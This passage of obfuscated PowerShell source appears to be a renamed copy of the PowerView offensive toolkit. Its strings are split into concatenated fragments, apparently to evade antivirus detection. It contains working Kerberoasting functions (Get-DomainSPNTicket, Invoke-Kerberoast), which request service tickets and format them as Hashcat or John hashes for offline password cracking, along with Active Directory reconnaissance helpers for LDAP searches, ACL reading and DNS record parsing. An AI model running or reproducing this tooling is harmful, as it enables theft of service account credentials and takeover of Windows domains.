        [Parameter(Position = 0, ParameterSetName = "R`Aw`SPn", Mandatory = $True, ValueFromPipeline = $True)]
        [ValidatePattern(('.*'+'/.*'))]
        [Alias(('Service'+'Prin'+'cipal'+'N'+'am'+'e'))]
        [String[]]
        $SPN,

        [Parameter(Position = 0, ParameterSetName = "Us`ER", Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateScript({ $_.PSObject.TypeNames[0] -eq ('P'+'ower'+'Bla'+'.User') })]
        [Object[]]
        $User,

        [ValidateSet(('Jo'+'hn'), ('H'+'ashc'+'at'))]
        [Alias(('Fo'+'rmat'))]
        [String]
        $OutputFormat = ('Has'+'hcat'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $Null = [Reflection.Assembly]::LoadWithPartialName(('Syste'+'m'+'.Id'+'entity'+'Mo'+'del'))

        if ($PSBoundParameters[('Cre'+'dentia'+'l')]) {
            $LogonToken = &('Invo'+'ke-'+'User'+'I'+'m'+'person'+'atio'+'n') -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[('Use'+'r')]) {
            $TargetObject = $User
        }
        else {
            $TargetObject = $SPN
        }

        ForEach ($Object in $TargetObject) {
            if ($PSBoundParameters[('Use'+'r')]) {
                $UserSPN = $Object.ServicePrincipalName
                $SamAccountName = $Object.SamAccountName
                $DistinguishedName = $Object.DistinguishedName
            }
            else {
                $UserSPN = $Object
                $SamAccountName = ('UN'+'KNOWN')
                $DistinguishedName = ('UNKN'+'OWN')
            }

            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
                $UserSPN = $UserSPN[0]
            }

            try {
                $Ticket = &('New-'+'Obj'+'ect') System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
            }
            catch {
                &('W'+'rite-War'+'ning') ('[Get-Domai'+'nS'+'PNTicket'+']'+' '+'Error'+' '+'reque'+'s'+'tin'+'g '+'tic'+'ket '+'f'+'or '+'S'+'PN '+"'$UserSPN' "+'f'+'rom '+'user'+' '+"'$DistinguishedName' "+': '+"$_")
            }
            if ($Ticket) {
                $TicketByteStream = $Ticket.GetRequest()
            }
            if ($TicketByteStream) {
                $Out = &('N'+'ew-Obje'+'c'+'t') PSObject

                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'

                $Out | &('Add-Memb'+'e'+'r') Noteproperty ('Sam'+'Acc'+'ou'+'ntN'+'ame') $SamAccountName
                $Out | &('Add-Me'+'mb'+'er') Noteproperty ('D'+'i'+'sti'+'nguis'+'hedName') $DistinguishedName
                $Out | &('Add-M'+'em'+'ber') Noteproperty ('Ser'+'vicePr'+'inci'+'p'+'alN'+'ame') $Ticket.ServicePrincipalName

                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)

                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne ('A'+'482')) {
                        &('Write'+'-Warn'+'ing') "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                        $Hash = $null
                        $Out | &('Add-M'+'e'+'m'+'ber') Noteproperty ('T'+'i'+'c'+'ke'+'tByte'+'HexStrea'+'m') ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                    } else {
                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
                        $Out | &('Add-'+'M'+'embe'+'r') Noteproperty ('Ti'+'c'+'ketByt'+'eHe'+'xStream') $null
                    }
                } else {
                    &('W'+'rite'+'-Warni'+'ng') "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq "
                    $Hash = $null
                    $Out | &('Add-M'+'e'+'mber') Noteproperty ('TicketB'+'yte'+'He'+'xS'+'tream') ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
                }

                if($Hash) {
                    if ($OutputFormat -match ('Jo'+'hn')) {
                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
                    }
                    else {
                        if ($DistinguishedName -ne ('U'+'NKNOWN')) {
                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf(('DC'+'='))) -replace ('D'+'C='),'' -replace ',','.'
                        }
                        else {
                            $UserDomain = ('U'+'N'+'KNOWN')
                        }

                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
                    }
                    $Out | &('A'+'dd-Mem'+'ber') Noteproperty ('H'+'ash') $HashFormat
                }

                $Out.PSObject.TypeNames.Insert(0, ('P'+'owerBla.'+'S'+'PNTicket'))
                $Out
            }
        }
    }

    END {
        if ($LogonToken) {
            &('I'+'nvok'+'e-Reve'+'rtToSelf') -TokenHandle $LogonToken
        }
    }
}


function Invoke-Kerberoast {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSSh'+'o'+'u'+'ldProcess'), '')]
    [OutputType(('P'+'owe'+'rBla.SPN'+'Tick'+'et'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('Dist'+'i'+'nguish'+'e'+'dName'), ('Sam'+'Accou'+'n'+'tName'), ('Na'+'me'), ('Membe'+'rDistingu'+'ishe'+'d'+'Name'), ('Memb'+'er'+'Name'))]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('F'+'ilter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADSP'+'ath'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(('DomainC'+'ontro'+'l'+'ler'))]
        [String]
        $Server,

        [ValidateSet(('B'+'ase'), ('OneLeve'+'l'), ('Subtre'+'e'))]
        [String]
        $SearchScope = ('S'+'ubtre'+'e'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [ValidateSet(('Joh'+'n'), ('Has'+'hcat'))]
        [Alias(('Forma'+'t'))]
        [String]
        $OutputFormat = ('Has'+'hcat'),

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $UserSearcherArguments = @{
            ('SP'+'N') = $True
            ('P'+'r'+'operties') = ('samaccoun'+'tname,'+'dist'+'inguis'+'he'+'dname,s'+'erv'+'ice'+'prin'+'cipaln'+'a'+'m'+'e')
        }
        if ($PSBoundParameters[('D'+'omain')]) { $UserSearcherArguments[('D'+'om'+'ain')] = $Domain }
        if ($PSBoundParameters[('LDA'+'PF'+'ilter')]) { $UserSearcherArguments[('LDAPFil'+'te'+'r')] = $LDAPFilter }
        if ($PSBoundParameters[('Sea'+'rchBa'+'se')]) { $UserSearcherArguments[('Searc'+'hB'+'ase')] = $SearchBase }
        if ($PSBoundParameters[('Ser'+'ver')]) { $UserSearcherArguments[('Serv'+'e'+'r')] = $Server }
        if ($PSBoundParameters[('Se'+'arc'+'hScop'+'e')]) { $UserSearcherArguments[('SearchSco'+'p'+'e')] = $SearchScope }
        if ($PSBoundParameters[('Re'+'sul'+'t'+'Page'+'Size')]) { $UserSearcherArguments[('R'+'es'+'u'+'ltPageSiz'+'e')] = $ResultPageSize }
        if ($PSBoundParameters[('S'+'erver'+'TimeLi'+'mi'+'t')]) { $UserSearcherArguments[('Ser'+'ve'+'rTimeL'+'imi'+'t')] = $ServerTimeLimit }
        if ($PSBoundParameters[('Tombs'+'t'+'o'+'ne')]) { $UserSearcherArguments[('Tombston'+'e')] = $Tombstone }
        if ($PSBoundParameters[('Crede'+'nt'+'ial')]) { $UserSearcherArguments[('Cre'+'dent'+'i'+'al')] = $Credential }

        if ($PSBoundParameters[('Cred'+'ent'+'ial')]) {
            $LogonToken = &('Invo'+'ke-UserImp'+'er'+'son'+'a'+'t'+'ion') -Credential $Credential
        }
    }

    PROCESS {
        if ($PSBoundParameters[('I'+'dentity')]) { $UserSearcherArguments[('Iden'+'t'+'ity')] = $Identity }
        &('Get-'+'Do'+'mainUser') @UserSearcherArguments | &('W'+'here-Ob'+'ject') {$_.samaccountname -ne ('kr'+'bt'+'gt')} | &('Get-Do'+'mainSPN'+'T'+'ic'+'ke'+'t') -OutputFormat $OutputFormat
    }

    END {
        if ($LogonToken) {
            &('In'+'voke-'+'Revert'+'ToS'+'elf') -TokenHandle $LogonToken
        }
    }
}


function Get-PathAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShouldP'+'roc'+'e'+'ss'), '')]
    [OutputType(('Po'+'werBla.'+'File'+'AC'+'L'))]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias(('F'+'ullNam'+'e'))]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {

        function Convert-FileRight {
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]('0x8'+'00000'+'0'+'0') = ('Generi'+'cRe'+'ad')
                [uint32]('0'+'x4000'+'00'+'00') = ('Generic'+'Wri'+'t'+'e')
                [uint32]('0'+'x200000'+'0'+'0') = ('Gener'+'icE'+'x'+'ecute')
                [uint32]('0x10000'+'0'+'0'+'0') = ('Gen'+'eric'+'Al'+'l')
                [uint32]('0x'+'020'+'00000') = ('Maxim'+'umAllo'+'we'+'d')
                [uint32]('0x010'+'0000'+'0') = ('Acce'+'ssSystem'+'S'+'ecurit'+'y')
                [uint32]('0x0'+'01000'+'00') = ('Sync'+'hro'+'nize')
                [uint32]('0x'+'0'+'00'+'80000') = ('WriteO'+'w'+'n'+'er')
                [uint32]('0'+'x0'+'0040000') = ('Writ'+'eD'+'AC')
                [uint32]('0x'+'0002'+'0000') = ('R'+'e'+'ad'+'Control')
                [uint32]('0x00'+'010'+'00'+'0') = ('Del'+'ete')
                [uint32]('0x0'+'00'+'001'+'00') = ('Wr'+'iteAttr'+'ibut'+'es')
                [uint32]('0x00'+'0000'+'8'+'0') = ('Read'+'Attr'+'ibu'+'te'+'s')
                [uint32]('0x0000'+'004'+'0') = ('D'+'e'+'leteChi'+'ld')
                [uint32]('0x000'+'0002'+'0') = ('E'+'xec'+'u'+'te/'+'Traverse')
                [uint32]('0x'+'00000'+'010') = ('Wri'+'teE'+'xte'+'nded'+'At'+'t'+'ributes')
                [uint32]('0x'+'0000000'+'8') = ('R'+'eadExtendedAttr'+'ib'+'ute'+'s')
                [uint32]('0'+'x00000'+'004') = ('A'+'p'+'pendData/AddS'+'ubdi'+'rectory')
                [uint32]('0'+'x000000'+'0'+'2') = ('Writ'+'eData/'+'AddF'+'ile')
                [uint32]('0x0'+'00000'+'01') = ('R'+'ea'+'d'+'Data'+'/List'+'Di'+'rectory')
            }

            $SimplePermissions = @{
                [uint32]('0x'+'1f01f'+'f') = ('FullC'+'ont'+'rol')
                [uint32]('0'+'x'+'0301bf') = ('M'+'od'+'ify')
                [uint32]('0'+'x0200a'+'9') = ('Rea'+'dA'+'ndExe'+'cute')
                [uint32]('0x'+'0'+'2019f') = ('Rea'+'dAnd'+'Writ'+'e')
                [uint32]('0x0'+'2008'+'9') = ('Rea'+'d')
                [uint32]('0x'+'0'+'00116') = ('Writ'+'e')
            }

            $Permissions = @()

            $Permissions += $SimplePermissions.Keys | &('For'+'Ea'+'ch-Ob'+'ject') {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            $Permissions += $AccessMask.Keys | &('Whe'+'re-Ob'+'jec'+'t') { $FSR -band $_ } | &('F'+'orEach-O'+'b'+'ject') { $AccessMask[$_] }
            ($Permissions | &('Whe'+'re-Obje'+'ct') {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters[('C'+'redenti'+'al')]) { $ConvertArguments[('Crede'+'n'+'tial')] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match (('N50N'+'50N5'+'0N50.*'+'N5'+'0N5'+'0.*').RePlACe('N50','\'))) -and ($PSBoundParameters[('Cr'+'e'+'dential')])) {
                    $HostComputer = (&('New'+'-Obj'+'ect') System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        &('A'+'dd-R'+'e'+'moteC'+'onnecti'+'on') -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = &('Get'+'-A'+'cl') -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | &('F'+'orEach-Ob'+'je'+'ct') {
                    $SID = $_.IdentityReference.Value
                    $Name = &('Co'+'nvertFr'+'om-SID') -ObjectSID $SID @ConvertArguments

                    $Out = &('New-Obje'+'c'+'t') PSObject
                    $Out | &('Add-'+'M'+'em'+'ber') Noteproperty ('Pa'+'th') $TargetPath
                    $Out | &('Add'+'-Me'+'mb'+'er') Noteproperty ('Fi'+'leSys'+'te'+'mRights') (&('Conve'+'rt-Fi'+'le'+'Right') -FSR $_.FileSystemRights.value__)
                    $Out | &('A'+'d'+'d-Me'+'mber') Noteproperty ('I'+'dent'+'ityReferen'+'ce') $Name
                    $Out | &('Add-Mem'+'be'+'r') Noteproperty ('Id'+'entity'+'SID') $SID
                    $Out | &('A'+'dd-Mem'+'ber') Noteproperty ('Ac'+'cessCo'+'ntrolTy'+'pe') $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, ('Pow'+'er'+'Bla.'+'FileA'+'CL'))
                    $Out
                }
            }
            catch {
                &('Writ'+'e-Ve'+'rbose') ('['+'Get-'+'PathAcl]'+' '+'erro'+'r:'+' '+"$_")
            }
        }
    }

    END {
        $MappedComputers.Keys | &('Remove-Re'+'mo'+'t'+'e'+'Co'+'nn'+'ect'+'ion')
    }
}


function Convert-LDAPProperty {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSShou'+'ldProc'+'es'+'s'), '')]
    [OutputType(('Syst'+'em.'+'Management.Au'+'tomation.P'+'SCu'+'st'+'o'+'mO'+'bjec'+'t'))]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | &('F'+'orE'+'ach-O'+'bj'+'ect') {
        if ($_ -ne ('ad'+'s'+'path')) {
            if (($_ -eq ('o'+'bj'+'e'+'ctsid')) -or ($_ -eq ('sidh'+'ist'+'ory'))) {
                $ObjectProperties[$_] = $Properties[$_] | &('ForE'+'ach-O'+'b'+'ject') { (&('N'+'ew-Obj'+'ect') System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq ('gr'+'ouptyp'+'e')) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq ('sama'+'ccou'+'nttype')) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq ('objec'+'t'+'guid')) {
                $ObjectProperties[$_] = (&('N'+'ew'+'-'+'Object') Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq ('useracco'+'untcontr'+'o'+'l')) {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq ('nts'+'ecur'+'ityd'+'escri'+'pto'+'r')) {
                $Descriptor = &('New'+'-'+'Object') Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties[('Own'+'er')] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties[('G'+'roup')] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties[('D'+'iscretio'+'naryA'+'cl')] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties[('Syste'+'m'+'Acl')] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq ('ac'+'co'+'untexpir'+'es')) {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = ('NEVE'+'R')
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq ('last'+'log'+'on')) -or ($_ -eq ('lastlo'+'gontimes'+'t'+'amp')) -or ($_ -eq ('pwdla'+'stse'+'t')) -or ($_ -eq ('las'+'tlogo'+'ff')) -or ($_ -eq ('badPa'+'ssw'+'o'+'rdTim'+'e')) ) {
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember(('H'+'ighP'+'art'), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember(('Lo'+'wPa'+'rt'),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember(('HighPa'+'rt'), [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember(('Lo'+'wP'+'art'),  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                    &('Wr'+'it'+'e-Verb'+'ose') ('[C'+'onver'+'t-'+'LDA'+'P'+'Pro'+'perty] '+'e'+'rror:'+' '+"$_")
                    $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        &('Ne'+'w-'+'Obj'+'ect') -TypeName PSObject -Property $ObjectProperties
    }
    catch {
        &('Wri'+'t'+'e-Warnin'+'g') ('[Con'+'vert'+'-LD'+'APPr'+'operty] '+'Erro'+'r '+'p'+'arsi'+'ng '+'LDA'+'P '+'p'+'ro'+'per'+'ties '+': '+"$_")
    }
}



function Get-DomainSearcher {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('P'+'SSho'+'u'+'l'+'dProcess'), '')]
    [OutputType(('Sy'+'ste'+'m.Di'+'rec'+'t'+'ory'+'Services.D'+'irectorySea'+'rche'+'r'))]
    [CmdletBinding()]
    Param(
        [Parameter(ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(('Fi'+'lter'))]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(('ADS'+'Pat'+'h'))]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [String]
        $SearchBasePrefix,

        [ValidateNotNullOrEmpty()]
        [Alias(('Do'+'ma'+'in'+'C'+'ontroller'))]
        [String]
        $Server,

        [ValidateSet(('Bas'+'e'), ('OneL'+'evel'), ('Subtre'+'e'))]
        [String]
        $SearchScope = ('S'+'ub'+'tree'),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit = 120,

        [ValidateSet(('Da'+'cl'), ('Gro'+'up'), ('Non'+'e'), ('Own'+'er'), ('S'+'acl'))]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        if ($PSBoundParameters[('Doma'+'i'+'n')]) {
            $TargetDomain = $Domain

            if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
                $UserDomain = $ENV:USERDNSDOMAIN
                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                }
            }
        }
        elseif ($PSBoundParameters[('Cr'+'ede'+'nti'+'al')]) {
            $DomainObject = &('Get-Dom'+'ai'+'n') -Credential $Credential
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }
        elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
            $TargetDomain = $ENV:USERDNSDOMAIN
            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
            }
        }
        else {
            &('wr'+'ite-verbo'+'se') ('get-'+'do'+'main')
            $DomainObject = &('Get-'+'Doma'+'in')
            $BindServer = ($DomainObject.PdcRoleOwner).Name
            $TargetDomain = $DomainObject.Name
        }

        if ($PSBoundParameters[('S'+'erve'+'r')]) {
            $BindServer = $Server
        }

        $SearchString = ('LDAP'+':/'+'/')

        if ($BindServer -and ($BindServer.Trim() -ne '')) {
            $SearchString += $BindServer
            if ($TargetDomain) {
                $SearchString += '/'
            }
        }

        if ($PSBoundParameters[('Sear'+'c'+'h'+'B'+'asePrefix')]) {
            $SearchString += $SearchBasePrefix + ','
        }

        if ($PSBoundParameters[('Se'+'a'+'rc'+'hBase')]) {
            if ($SearchBase -Match ('^'+'GC:'+'//')) {
                $DN = $SearchBase.ToUpper().Trim('/')
                $SearchString = ''
            }
            else {
                if ($SearchBase -match ('^L'+'DAP://')) {
                    if ($SearchBase -match ('LD'+'AP://'+'.'+'+/.+')) {
                        $SearchString = ''
                        $DN = $SearchBase
                    }
                    else {
                        $DN = $SearchBase.SubString(7)
                    }
                }
                else {
                    $DN = $SearchBase
                }
            }
        }
        else {
            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
            }
        }

        $SearchString += $DN
        &('Wr'+'ite-Ver'+'b'+'ose') ('[Get-'+'Domai'+'nSe'+'a'+'rc'+'her] '+'se'+'arc'+'h '+'b'+'ase'+': '+"$SearchString")

        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
            &('W'+'rite-V'+'erbos'+'e') ('[G'+'et-DomainSearch'+'e'+'r] Usi'+'ng alt'+'ernate c'+'rede'+'nt'+'ials for'+' L'+'DAP conn'+'e'+'ction')
            $DomainObject = &('New-Ob'+'j'+'ect') DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
            $Searcher = &('New'+'-Obj'+'ec'+'t') System.DirectoryServices.DirectorySearcher($DomainObject)
        }
        else {
            $Searcher = &('New-Ob'+'jec'+'t') System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
        }

        $Searcher.PageSize = $ResultPageSize
        $Searcher.SearchScope = $SearchScope
        $Searcher.CacheResults = $False
        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All

        if ($PSBoundParameters[('Se'+'r'+'ve'+'rT'+'imeLimit')]) {
            $Searcher.ServerTimeLimit = $ServerTimeLimit
        }

        if ($PSBoundParameters[('Tombst'+'one')]) {
            $Searcher.Tombstone = $True
        }

        if ($PSBoundParameters[('LDAP'+'Fi'+'lter')]) {
            $Searcher.filter = $LDAPFilter
        }

        if ($PSBoundParameters[('S'+'ec'+'urityMa'+'sks')]) {
            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                ('Da'+'cl') { [System.DirectoryServices.SecurityMasks]::Dacl }
                ('Grou'+'p') { [System.DirectoryServices.SecurityMasks]::Group }
                ('Non'+'e') { [System.DirectoryServices.SecurityMasks]::None }
                ('O'+'wner') { [System.DirectoryServices.SecurityMasks]::Owner }
                ('Sa'+'cl') { [System.DirectoryServices.SecurityMasks]::Sacl }
            }
        }

        if ($PSBoundParameters[('Prop'+'ertie'+'s')]) {
            $PropertiesToLoad = $Properties| &('F'+'orEach-'+'O'+'bject') { $_.Split(',') }
            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
        }

        $Searcher
    }
}


function Convert-DNSRecord {


    [OutputType(('System'+'.Man'+'agemen'+'t'+'.'+'Automation'+'.PSCustom'+'Ob'+'je'+'ct'))]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
        [Byte[]]
        $DNSRecord
    )

    BEGIN {
        function Get-Name {
            [Diagnostics.CodeAnalysis.SuppressMessageAttribute(('PSU'+'se'+'Out'+'put'+'TypeCorrec'+'t'+'ly'), '')]
            [CmdletBinding()]
            Param(
                [Byte[]]
                $Raw
            )

            [Int]$Length = $Raw[0]
            [Int]$Segments = $Raw[1]
            [Int]$Index =  2
            [String]$Name  = ''

            while ($Segments-- -gt 0)
            {
                [Int]$SegmentLength = $Raw[$Index++]
                while ($SegmentLength-- -gt 0) {
                    $Name += [Char]$Raw[$Index++]
                }
                $Name += "."
            }
            $Name
        }
    }

    PROCESS {
        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)

        $TTLRaw = $DNSRecord[12..15]

        $Null = [array]::Reverse($TTLRaw)
        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)

        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
        if ($Age -ne 0) {
            $TimeStamp = ((&('Get-'+'Da'+'te') -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
        }
        else {
            $TimeStamp = ('[stat'+'ic]')
        }

        $DNSRecordObject = &('New-Obj'+'e'+'c'+'t') PSObject

        if ($RDataType -eq 1) {
            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
            $Data = $IP
            $DNSRecordObject | &('A'+'dd-Memb'+'er') Noteproperty ('Recor'+'dTy'+'pe') 'A'
        }

        elseif ($RDataType -eq 2) {
            $NSName = &('G'+'et'+'-Name') $DNSRecord[24..$DNSRecord.length]
            $Data = $NSName
            $DNSRecordObject | &('Ad'+'d'+'-Membe'+'r') Noteproperty ('R'+'ecordTy'+'pe') 'NS'
        }

        elseif ($RDataType -eq 5) {
            $Alias = &('Ge'+'t'+'-Name') $DNSRecord[24..$DNSRecord.length]
            $Data = $Alias
            $DNSRecordObject | &('Add'+'-M'+'emb'+'er') Noteproperty ('Re'+'cord'+'Type') ('C'+'NAME')
        }

        elseif ($RDataType -eq 6) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | &('Ad'+'d-Mem'+'ber') Noteproperty ('RecordT'+'yp'+'e') ('SO'+'A')
        }

        elseif ($RDataType -eq 12) {
            $Ptr = &('G'+'et'+'-Name') $DNSRecord[24..$DNSRecord.length]
            $Data = $Ptr
            $DNSRecordObject | &('Ad'+'d-Me'+'mber') Noteproperty ('Record'+'Typ'+'e') ('P'+'TR')
        }

        elseif ($RDataType -eq 13) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | &('Add'+'-'+'Member') Noteproperty ('Recor'+'dT'+'ype') ('HINF'+'O')
        }

        elseif ($RDataType -eq 15) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | &('Ad'+'d-M'+'emb'+'er') Noteproperty ('R'+'eco'+'rdType') 'MX'
        }

        elseif ($RDataType -eq 16) {
            [string]$TXT  = ''
            [int]$SegmentLength = $DNSRecord[24]
            $Index = 25

            while ($SegmentLength-- -gt 0) {
                $TXT += [char]$DNSRecord[$index++]
            }

            $Data = $TXT
            $DNSRecordObject | &('A'+'dd-Membe'+'r') Noteproperty ('R'+'ecordT'+'ype') ('T'+'XT')
        }

        elseif ($RDataType -eq 28) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | &('Add-M'+'e'+'mber') Noteproperty ('R'+'eco'+'rdTyp'+'e') ('AAA'+'A')
        }

        elseif ($RDataType -eq 33) {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
            $DNSRecordObject | &('Ad'+'d-Mem'+'ber') Noteproperty ('Rec'+'o'+'rdTyp'+'e') ('S'+'RV')
        }

        else {
            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
